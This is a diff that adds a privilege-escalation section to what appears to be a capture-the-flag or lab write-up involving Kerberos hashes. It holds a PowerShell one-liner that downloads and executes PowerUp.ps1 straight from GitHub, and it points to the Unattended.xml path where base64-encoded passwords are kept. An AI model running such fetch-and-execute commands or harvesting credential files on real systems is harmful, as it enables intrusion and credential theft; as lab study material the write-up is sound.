@@ -44,6 +44,20 @@ Kerberos 5 TGS-REP etype 23
 ```
 and the hashcat code for this is 13100.
 
+**PrivEsc**
+
+We will run PowerUp.ps1 for the enumeration.
+
+```bash
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
+```
+
+The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.
+
+"Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode."
+
+It is also where users passwords are stored in base64. Navigate to C:\Windows\Panther\Unattend\Unattended.xml.
+
 
 
 
